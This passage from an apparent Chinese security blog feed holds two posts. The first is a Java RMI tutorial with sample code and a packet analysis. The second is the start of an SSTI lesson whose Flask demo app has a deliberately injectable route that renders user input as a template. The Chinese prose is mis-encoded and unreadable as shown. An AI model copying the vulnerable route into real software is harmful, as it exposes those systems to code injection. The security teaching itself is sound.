class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Remoteæ¥å£æ˜¯ä¸€ä¸ªæ ‡è¯†æ¥å£ï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ–¹æ³•ï¼Œè¯¥æ¥å£ç”¨äºæ ‡è¯†å…¶å­ç±»çš„æ–¹æ³•å¯ä»¥</span></span><br><span class="line"><span class="comment">//è¢«éæœ¬åœ°çš„Javaè™šæ‹Ÿæœºè°ƒç”¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå®ç°ç±»<code>HelloImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello,"</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®ç°ç±»å¿…é¡»è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ï¼Œå®¢æˆ·ç«¯è®¿é—®è·å¾—è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè¿œç¨‹å¯¹è±¡æ‰ä¼šæŠŠè‡ªèº«çš„ä¸€ä¸ªæ‹·è´ä»¥<code>Socket</code>çš„å½¢å¼ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œè¿™ä¸ªæ‹·è´ä¹Ÿå°±æ˜¯<code>Stub</code>ï¼Œä¹Ÿå¯ä»¥å«åšâ€å­˜æ ¹â€ï¼Œè¿™ä¸ªâ€Stubâ€å¯ä»¥çœ‹ä½œæ˜¯è¿œç¨‹å¯¹è±¡åœ¨æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ï¼Œå…¶ä¸­åŒ…å«äº†è¿œç¨‹å¯¹è±¡çš„å…·ä½“ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿™ä¸ªä»£ç†ä¸æœåŠ¡ç«¯è¿›è¡Œäº¤äº’ã€‚</p><p>æœ€åå®ç°è¯¥ç±»çš„è¿œç¨‹æ¥å£ä¸­çš„<code>sayHello()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HelloImpl å¯¹è±¡åœ¨å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨å…¶çˆ¶ç±» UnicastRemoteObject çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">            <span class="comment">// ç”Ÿæˆå¯¹åº”çš„ Stub å’Œ Skeleton</span></span><br><span class="line">            Hello h = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">            <span class="comment">//åœ¨æœ¬åœ°åˆ›å»ºå¹¶å¯åŠ¨ RMIService , è¢«åˆ›å»ºçš„ RMIService æœåŠ¡å°†ä¼šåœ¨æŒ‡å®šçš„ç«¯å£ä¸Šç›‘å¬è¯·æ±‚</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">//å°†è¿œç¨‹å¯¹è±¡ " h " ç»‘å®šåˆ° rmi://localhost:1099/hello è¿™ä¸ª URL ä¸Š . å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿™ä¸ª URL ç›´æ¥è®¿é—®è¿œç¨‹å¯¹è±¡ .</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://localhost:1099/hello"</span>,h);</span><br><span class="line">            System.out.println(<span class="string">"HelloServer å¯åŠ¨æˆåŠŸ"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±æ˜¯<code>server</code>ç«¯çš„é…ç½®</p><p>æ¥ç€æˆ‘ä»¬å®ç°<code>client</code>ç«¯çš„é…ç½®ï¼Œå®¢æˆ·ç«¯åªéœ€è¦ä¸€ä¸ªè¿æ¥ç¨‹åºï¼Œå³å¯å®ç°è¿œç¨‹è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.client;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.server.Hello;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//å®¢æˆ·ç«¯åªéœ€è¦è°ƒç”¨ java.rmi.Naming.lookup å‡½æ•°</span></span><br><span class="line">            <span class="comment">//é€šè¿‡å…¬å¼€çš„è·¯å¾„ä» RMIService ä¸Šæ‹¿åˆ°å¯¹åº”æ¥å£çš„å®ç°ç±»</span></span><br><span class="line">            Hello h = (Hello) Naming.lookup(<span class="string">"rmi://localhost:1099/hello"</span>);</span><br><span class="line">            System.out.println(h.sayHello(<span class="string">"Elssm"</span>));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"urlæ ¼å¼å¼‚å¸¸"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"åˆ›å»ºå¯¹è±¡å¼‚å¸¸"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"å¯¹è±¡æœªç»‘å®š"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMIæ‰§è¡Œè¿‡ç¨‹"><a href="#RMIæ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="RMIæ‰§è¡Œè¿‡ç¨‹"></a>RMIæ‰§è¡Œè¿‡ç¨‹</h4><p>æˆ‘ä»¬å†™å¥½çš„RMIæ–‡ä»¶ç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rmi</span><br><span class="line">â”œâ”€â”€ client</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ HelloClient.java</span><br><span class="line">â””â”€â”€ server</span><br><span class="line">    â”œâ”€â”€ Hello.java</span><br><span class="line">    â”œâ”€â”€ HelloImpl.java</span><br><span class="line">    â””â”€â”€ HelloServer.java</span><br></pre></td></tr></table></figure><h5 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/server<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java rmi/client<span class="comment">/*.java</span></span><br></pre></td></tr></table></figure><h5 id="ç”ŸæˆStubå­˜æ ¹"><a href="#ç”ŸæˆStubå­˜æ ¹" class="headerlink" title="ç”ŸæˆStubå­˜æ ¹"></a>ç”ŸæˆStubå­˜æ ¹</h5><p><img src="/2021/12/01/Java-RMI/1.png" alt="1"></p><p>ç„¶åå°†æœåŠ¡ç«¯ç”Ÿæˆçš„<code>Stub</code>å­˜æ ¹å¤åˆ¶åˆ°å®¢æˆ·ç«¯ç›®å½•ä¸‹ï¼Œæœ€åæˆ‘ä»¬RMIæ–‡ä»¶ç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro src % tree rmi                                      </span><br><span class="line">rmi</span><br><span class="line">â”œâ”€â”€ client</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ HelloClient<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">â”‚Â Â  â”œâ”€â”€ <span class="title">HelloClient</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">â”‚Â Â  â””â”€â”€ <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">â””â”€â”€ <span class="title">server</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">Hello</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">Hello</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">HelloImpl</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">HelloImpl</span>.<span class="title">java</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">HelloImpl_Stub</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    â”œâ”€â”€ <span class="title">HelloServer</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">    â””â”€â”€ <span class="title">HelloServer</span>.<span class="title">java</span></span></span><br></pre></td></tr></table></figure><h5 id="å¯åŠ¨RMIæœåŠ¡ç«¯"><a href="#å¯åŠ¨RMIæœåŠ¡ç«¯" class="headerlink" title="å¯åŠ¨RMIæœåŠ¡ç«¯"></a>å¯åŠ¨RMIæœåŠ¡ç«¯</h5><p><img src="/2021/12/01/Java-RMI/2.png" alt="2"></p><h5 id="å¯åŠ¨RMIå®¢æˆ·ç«¯"><a href="#å¯åŠ¨RMIå®¢æˆ·ç«¯" class="headerlink" title="å¯åŠ¨RMIå®¢æˆ·ç«¯"></a>å¯åŠ¨RMIå®¢æˆ·ç«¯</h5><p><img src="/2021/12/01/Java-RMI/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸè°ƒç”¨æœåŠ¡ç«¯çš„<code>sayHello()</code>æ–¹æ³•</p><h4 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡Wiresharkè¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æï¼Œåœ¨å®¢æˆ·ç«¯è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸¤æ¬¡å®Œæ•´çš„æ•°æ®äº¤äº’ã€‚å¯ä»¥é€šè¿‡<code>tcp.stream eq ä¼šè¯åºå·</code>åˆ’åˆ†</p><p><img src="/2021/12/01/Java-RMI/4.png" alt="4"></p><p><img src="/2021/12/01/Java-RMI/5.png" alt="5"></p><h5 id="tcp-stream-eq-17"><a href="#tcp-stream-eq-17" class="headerlink" title="tcp.stream eq 17"></a>tcp.stream eq 17</h5><p>ä¸€å¼€å§‹æ˜¯<code>TCP</code>ä¸‰æ¬¡æ¡æ‰‹</p><p><img src="/2021/12/01/Java-RMI/7.png" alt="7"></p><p>æ¥ç€æ˜¯RMIä»£ç†çš„ç¡®è®¤å·¥ä½œï¼Œè¿™é‡ŒRMIä»£ç†è¿”å›äº†å®¢æˆ·ç«¯çš„IPåœ°å€å’Œç«¯å£ï¼Œç”¨äºç¡®è®¤è¦è¿›è¡Œçš„RMIæœåŠ¡æ˜¯å¦æ˜¯RMIå®¢æˆ·ç«¯ï¼Œå¦‚æœRMIå®¢æˆ·ç«¯åšå‡ºå“åº”ï¼Œåˆ™ä»£è¡¨RMIå®¢æˆ·ç«¯éœ€è¦RMIæœåŠ¡</p><p><img src="/2021/12/01/Java-RMI/8.png" alt="8"></p><p>éšåæ˜¯RMIå®¢æˆ·ç«¯çš„ç¡®è®¤å·¥ä½œï¼Œç»è¿‡RMIå®¢æˆ·ç«¯å’ŒRMIä»£ç†çš„ç¡®è®¤ä¹‹åï¼Œåˆå§‹åŒ–å·¥ä½œå°±å®Œæˆäº†</p><p><img src="/2021/12/01/Java-RMI/9.png" alt="9"></p><p>åˆå§‹åŒ–å·¥ä½œå®Œæˆåï¼ŒRMIå®¢æˆ·ç«¯å¼€å§‹è¯·æ±‚RMIæœåŠ¡ç«¯ï¼Œè¿™ä¸€è¿‡ç¨‹é€šè¿‡<code>RMI Call</code>å®Œæˆ</p><p><img src="/2021/12/01/Java-RMI/10.png" alt="10"></p><p>è¿™é‡Œæˆ‘ä»¬å…·ä½“çœ‹ä¸€ä¸‹è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œé¦–å…ˆåœ¨Wiresharkä¸­è¿½è¸ªæ•°æ®æµï¼Œä¹‹åä»¥RAWæ ¼å¼æ˜¾ç¤ºæ•°æ®</p><p><img src="/2021/12/01/Java-RMI/11.png" alt="11"></p><p><img src="/2021/12/01/Java-RMI/12.png" alt="12"></p><p>å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°<code>ac ed 00 05</code>ç‰¹å¾ç ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>å·¥å…·è¿›è¡Œè§£æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1.13.jar 50aced00057722000000000000000000000000000000000000000000000000000344154dc9d4e63bdf74000568656c6c6f73720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e2ab53b1d296bd7e099cac7c1a220000017d73a2f78e80010078</span><br><span class="line"></span><br><span class="line">RMI Call - 0x50</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 34 - 0x22</span><br><span class="line">    Contents - 0x000000000000000000000000000000000000000000000000000344154dc9d4e63bdf</span><br><span class="line">  TC_STRING - 0x74</span><br><span class="line">    newHandle 0x00 7e 00 00</span><br><span class="line">    Length - 5 - 0x00 05</span><br><span class="line">    Value - hello - 0x68656c6c6f</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 25 - 0x00 19</span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - 0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯<code>ReturnData</code>çš„æ•°æ®åŒ…</p><p><img src="/2021/12/01/Java-RMI/13.png" alt="13"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="number">51</span>aced0005770f01353650820000017d739f868f800873720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e25c35c1c19f1dabc88b353650820000017d739f868f80010178</span><br><span class="line"></span><br><span class="line">RMI ReturnData - <span class="number">0x51</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x01353650820000017d739f868f8008</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">25</span> - <span class="number">0x00</span> <span class="number">19</span></span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - <span class="number">0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åœ¨<code>ReturnData</code>æ•°æ®åŒ…å°±åŒ…å«äº†RMIæœåŠ¡ç«¯çš„IPå’Œç«¯å£</p><p><img src="/2021/12/01/Java-RMI/14.png" alt="14"></p><p>ä¹‹åRMIå®¢æˆ·ç«¯å°±å¯ä»¥ç›´æ¥å»è®¿é—®RMIæœåŠ¡ç«¯ä¸Šå¯¹åº”ç±»çš„æ–¹æ³•ã€‚</p><h5 id="tcp-stream-eq-18"><a href="#tcp-stream-eq-18" class="headerlink" title="tcp.stream eq 18"></a>tcp.stream eq 18</h5><p>ä¸€ä¸Šæ¥è¿˜æ˜¯å…ˆè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹</p><p><img src="/2021/12/01/Java-RMI/15.png" alt="15"></p><p>ä¹‹åæ˜¯RMIæœåŠ¡ç«¯å’ŒRMIå®¢æˆ·ç«¯çš„ä¸€ä¸ªéªŒè¯è¿‡ç¨‹ï¼ŒæœåŠ¡ç«¯è¯¢é—®å®¢æˆ·ç«¯æ˜¯å¦æ˜¯<code>127.0.0.1</code>,å¦‚æœå®¢æˆ·ç«¯è¿”å›å“åº”ï¼Œåˆ™ä»£è¡¨å®¢æˆ·ç«¯éœ€è¦RMIæœåŠ¡</p><p><img src="/2021/12/01/Java-RMI/16.png" alt="16"></p><p>å®¢æˆ·ç«¯åœ¨åšå‡ºå›åº”åŒæ—¶ï¼Œç»§ç»­è¯·æ±‚<code>127.0.0.1</code>ï¼Œè¿™ä¸€æ­¥æ˜¯è°ƒç”¨<code>java.rmi</code>åŒ…ä¸­çš„ä¸€äº›ç±»</p><p><img src="/2021/12/01/Java-RMI/17.png" alt="17"></p><p>ä¹‹åå®Œæˆäº†<code>RMI Call</code>å’Œ<code>ReturnData</code>çš„è¿‡ç¨‹</p><p><img src="/2021/12/01/Java-RMI/18.png" alt="18"></p><p>ä»<code>Raw</code>æ•°æ®åŒ…ä¸­å¯ä»¥çœ‹å‡º</p><p><img src="/2021/12/01/Java-RMI/19.png" alt="19"></p><p><img src="/2021/12/01/Java-RMI/20.png" alt="20"></p><p><img src="/2021/12/01/Java-RMI/21.png" alt="21"></p><p>è¿™ä¸€æ­¥å®Œæˆä¹‹åï¼ŒRMIå®¢æˆ·ç«¯ä¼šå°†å‚æ•°ä¼ è¾“ç»™RMIæœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¼šåœ¨æœ¬åœ°æ‰§è¡Œåè¿”å›ç»“æœã€‚</p><p><img src="/2021/12/01/Java-RMI/22.png" alt="22"></p><p>æœåŠ¡ç«¯ä¼šå°†å‚æ•°å¸¦å…¥<code>sayHello()</code>å‡½æ•°æ‰§è¡Œï¼Œå¹¶å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</p><p><img src="/2021/12/01/Java-RMI/23.png" alt="23"></p><p>æœ€åè¿›è¡Œ<code>TCP</code>å››æ¬¡æŒ¥æ‰‹å¹¶ç»“æŸæ­¤æ¬¡è°ƒç”¨æµç¨‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h4&gt;&lt;p&gt;Java RMI æŒ‡çš„æ˜¯è¿œç¨‹æ–¹æ³•è°ƒç”¨ (Remote Method Invocation)ã€‚å®ƒæ˜¯ä¸€ç§æœºåˆ¶ï¼Œèƒ½å¤Ÿè®©åœ¨æŸä¸ª Java è™šæ‹Ÿæœºä¸Šçš„
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SSTIæ¨¡ç‰ˆæ³¨å…¥</title>
    <link href="elssm.github.io/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <id>elssm.github.io/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/</id>
    <published>2021-11-29T10:12:49.000Z</published>
    <updated>2021-12-13T09:50:57.706Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>SSTI(Server-Side Template Injection)æ¼æ´æ˜¯æ¨¡ç‰ˆå¼•æ“åœ¨ä½¿ç”¨æ¸²æŸ“å‡½æ•°çš„æ—¶å€™ï¼Œç”±äºä»£ç ä¸è§„èŒƒè€Œå¯¼è‡´çš„ä»£ç æ³¨å…¥æ¼æ´ï¼Œæ¨¡ç‰ˆå¼•æ“å’Œæ¸²æŸ“å‡½æ•°æœ¬èº«æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼Œè¯¥æ¼æ´çš„äº§ç”ŸåŸå› åœ¨äºç¨‹åºå‘˜å¯¹ä»£ç çš„ä¸ä¸¥è°¨ä¸è§„èŒƒï¼Œå¯¼è‡´äº†æ¨¡ç‰ˆå¯æ§ï¼Œä»è€Œå¼•å‘ä»£ç æ³¨å…¥ã€‚</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><ul><li>python3.6</li><li>Flaskæ¡†æ¶</li></ul><p><code>app.py</code>ä¸­ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello word!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test1')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    html_content = <span class="string">'use render_template_string'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ssti')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'code'</span>)</span><br><span class="line">    html_content = <span class="string">'&lt;h3&gt;%s&lt;/h3&gt;'</span> % (code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"10.100.163.201"</span>)</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>5000</code>ç«¯å£å¦‚ä¸‹æ‰€ç¤º</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/1.png" alt="1"></p><h4 id="æ¸²æŸ“æ–¹æ³•"><a href="#æ¸²æŸ“æ–¹æ³•" class="headerlink" 